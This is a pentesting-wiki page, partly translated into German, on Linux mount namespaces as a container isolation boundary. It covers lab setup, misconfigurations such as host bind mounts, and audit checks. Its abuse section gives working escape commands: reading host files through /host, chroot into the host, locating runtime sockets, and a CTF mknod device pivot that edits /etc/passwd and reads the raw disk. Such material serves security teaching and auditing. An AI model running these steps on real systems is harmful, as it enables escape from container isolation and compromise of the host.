# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

The mount namespace controls the **mount table** that a process sees. This is one of the most important container isolation features because the root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, and many runtime-specific helper mounts are all expressed through that mount table. Two processes may both access `/`, `/proc`, `/sys`, or `/tmp`, but what those paths resolve to depends on the mount namespace they are in.

From a container-security perspective, the mount namespace is often the difference between "this is a neatly prepared application filesystem" and "this process can directly see or influence the host filesystem". That is why bind mounts, `hostPath` volumes, privileged mount operations, and writable `/proc` or `/sys` exposures all revolve around this namespace.

## Funktionsweise

When a runtime launches a container, it usually creates a fresh mount namespace, prepares a root filesystem for the container, mounts procfs and other helper filesystems as needed, and then optionally adds bind mounts, tmpfs mounts, secrets, config maps, or host paths. Once that process is running inside the namespace, the set of mounts it sees is largely decoupled from the host's default view. The host may still see the real underlying filesystem, but the container sees the version assembled for it by the runtime.

This is powerful because it lets the container believe it has its own root filesystem even though the host is still managing everything. It is also dangerous because if the runtime exposes the wrong mount, the process suddenly gains visibility into host resources that the rest of the security model may not have been designed to protect.

## Labor

You can create a private mount namespace with:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Wenn du eine andere Shell außerhalb dieses Namespace öffnest und die Mount-Tabelle inspizierst, wirst du sehen, dass der tmpfs mount nur innerhalb des isolierten Mount-Namespace existiert. Das ist eine nützliche Übung, weil sie zeigt, dass mount-Isolation keine abstrakte Theorie ist; der Kernel präsentiert dem Prozess buchstäblich eine andere Mount-Tabelle.

Wenn du eine andere Shell außerhalb dieses Namespace öffnest und die Mount-Tabelle inspizierst, wird der tmpfs mount nur innerhalb des isolierten Mount-Namespace existieren.

In Containern sieht ein schneller Vergleich so aus:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Das zweite Beispiel zeigt, wie leicht eine Runtime-Konfiguration ein riesiges Loch durch die Dateisystem-Grenze reißen kann.

## Laufzeitnutzung

Docker, Podman, containerd-basierte Stacks und CRI-O verlassen sich alle auf ein privates mount namespace für normale Container. Kubernetes baut auf demselben Mechanismus für volumes, projected secrets, config maps und `hostPath` mounts auf. Incus/LXC-Umgebungen verlassen sich ebenfalls stark auf mount namespaces, besonders weil system containers häufig reichhaltigere und stärker maschinenähnliche Dateisysteme als application containers bereitstellen.

Das bedeutet, dass Sie bei der Überprüfung eines Container-Dateisystemproblems normalerweise nicht nur eine isolierte Docker-Eigenart betrachten. Sie betrachten ein mount-namespace- und Runtime-Konfigurationsproblem, ausgedrückt durch die Plattform, die die Workload gestartet hat.

## Fehlkonfigurationen

Der offensichtlichste und gefährlichste Fehler ist, das Host-Root-Dateisystem oder einen anderen sensiblen Host-Pfad über ein bind mount freizugeben, zum Beispiel `-v /:/host` oder ein beschreibbares `hostPath` in Kubernetes. An diesem Punkt lautet die Frage nicht mehr „kann der Container irgendwie entkommen?“, sondern vielmehr „wie viel nützlicher Host-Inhalt ist bereits direkt sichtbar und beschreibbar?“ Ein beschreibbares Host-bind-mount verwandelt den Rest des Exploits häufig in eine einfache Frage der Platzierung von Dateien, chroot, Konfigurationsänderung oder Entdeckung von Laufzeit-Sockets.

Ein weiteres häufiges Problem ist das Freigeben von Host-`/proc` oder `/sys` auf eine Weise, die die sicherere Container-Sicht umgeht. Diese Dateisysteme sind keine gewöhnlichen Daten-Mounts; sie sind Schnittstellen zum Kernel- und Prozesszustand. Wenn die Workload direkt auf die Host-Versionen zugreift, gelten viele der Annahmen, die der Container-Härtung zugrunde liegen, nicht mehr uneingeschränkt.

Schreibgeschützte Schutzmaßnahmen sind ebenfalls wichtig. Ein read-only Root-Dateisystem sichert einen Container nicht magisch, aber es nimmt dem Angreifer viel Vorbereitungsfläche und macht Persistenz, das Platzieren von Hilfs-Binaries und das Manipulieren von Konfigurationen schwieriger. Umgekehrt verschafft ein beschreibbares Root oder ein beschreibbares Host-bind-mount einem Angreifer Raum, den nächsten Schritt vorzubereiten.

## Missbrauch

Wenn das mount namespace missbraucht wird, tun Angreifer üblicherweise eines von vier Dingen. Sie **lesen Host-Daten**, die außerhalb des Containers hätten bleiben sollen. Sie **ändern Host-Konfigurationen** über beschreibbare bind mounts. Sie **mounten oder remounten zusätzliche Ressourcen**, falls capabilities und seccomp dies zulassen. Oder sie **erreichen mächtige Sockets und Laufzeit-Statusverzeichnisse**, die es ihnen ermöglichen, die Container-Plattform selbst um weitere Rechte zu bitten.

Wenn der Container das Host-Dateisystem bereits sehen kann, ändert sich der Rest des Sicherheitsmodells sofort.

Wenn Sie einen Host-bind-mount vermuten, bestätigen Sie zunächst, was verfügbar ist und ob es beschreibbar ist:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Wenn das Root-Dateisystem des Hosts read-write gemountet ist, ist direkter Host-Zugriff oft so einfach wie:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Wenn das Ziel privilegierter Laufzeitzugriff statt direktem chrooting ist, Sockets und runtime state auflisten:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, teste außerdem, ob neue mounts von innerhalb des Containers erstellt werden können:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Vollständiges Beispiel: Two-Shell `mknod` Pivot

Ein spezialisierterer Missbrauchspfad tritt auf, wenn der root-Benutzer des Containers Blockgeräte erstellen kann, Host und Container eine Benutzeridentität sinnvoll teilen und der Angreifer bereits einen niedrig privilegierten Zugang auf dem Host hat. In diesem Fall kann der Container einen Geräte-Knoten wie `/dev/sda` erstellen, und der niedrig privilegierte Host-Benutzer kann ihn später über `/proc/<pid>/root/` für den entsprechenden Containerprozess lesen.

Im Container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vom Host aus, als entsprechender Benutzer mit geringen Rechten, nachdem die PID der Container-Shell ermittelt wurde:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die wichtigste Lehre ist nicht die exakte CTF-String-Suche. Sie besteht darin, dass mount-namespace exposure durch `/proc/<pid>/root/` einem Host-Benutzer erlauben kann, von Containern erstellte device nodes wiederzuverwenden, selbst wenn die cgroup device policy die direkte Nutzung innerhalb des Containers verhinderte.

## Checks

Diese Befehle zeigen dir die Dateisystemansicht, in der der aktuelle Prozess tatsächlich lebt. Ziel ist es, host-abgeleitete Mounts, beschreibbare sensible Pfade und alles zu erkennen, das breiter aussieht als ein normales root-Dateisystem eines Anwendungscontainers.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Was hier interessant ist:

- Bind-Mounts vom Host, insbesondere `/`, `/proc`, `/sys`, Laufzeit-Statusverzeichnisse oder Socket-Pfade, sollten sofort auffallen.
- Unerwartete schreibbare Mounts sind normalerweise wichtiger als große Mengen nur-lesbarer Hilfs-Mounts.
- `mountinfo` ist oft der beste Ort, um zu sehen, ob ein Pfad wirklich vom Host abgeleitet oder overlay-basiert ist.

Diese Prüfungen legen fest, **welche Ressourcen in diesem Namespace sichtbar sind**, **welche davon vom Host stammen**, und **welche davon schreibbar oder sicherheitskritisch sind**.
{{#include ../../../../../banners/hacktricks-training.md}}
